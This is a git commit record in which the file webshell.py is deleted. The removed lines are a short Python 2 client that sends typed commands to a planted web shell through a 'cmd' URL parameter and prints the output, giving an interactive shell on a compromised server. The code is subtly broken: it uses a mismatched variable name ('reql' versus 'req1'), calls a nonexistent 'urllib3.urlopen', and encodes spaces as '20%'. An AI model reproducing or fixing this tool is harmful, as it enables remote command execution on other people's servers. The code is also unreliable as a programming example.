d314990d85f9d209e4e10a0e6daa5aaa4a92f1cd
Zack007-as <84616617+Zack007-as@users.noreply.github.com>
2021-05-22 14:33:55 +0300

    Delete webshell.py

--- webshell.py
+++
@@ -1,9 +0,0 @@
-import urllib3,sys
-
-shell = sys.argv[1]
-host = shell.split("/")[2]
-while True:
-    command = raw_input("sh33l@{0}~#".format(host))
-    reql = str("{0}?cmd={1}".format(shell,command)).replace(" ","20%")
-    request = urllib3.urlopen(req1)
-    print request.read() 
